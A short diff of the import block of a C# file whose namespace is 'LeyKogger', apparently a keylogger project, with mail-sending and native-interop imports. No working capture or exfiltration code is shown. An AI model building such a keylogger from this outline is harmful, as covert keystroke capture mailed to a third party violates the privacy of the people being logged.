@@ -1,12 +1,10 @@
 using System;
 using System.Runtime.InteropServices;
-using System.Diagnostics;
 using System.Windows.Forms;
 using System.IO;
 using System.Net.Mail;
 using System.Net;
 using System.Threading;
-using System.Threading.Tasks;
 using System.Collections.Generic;
 
 namespace LeyKogger
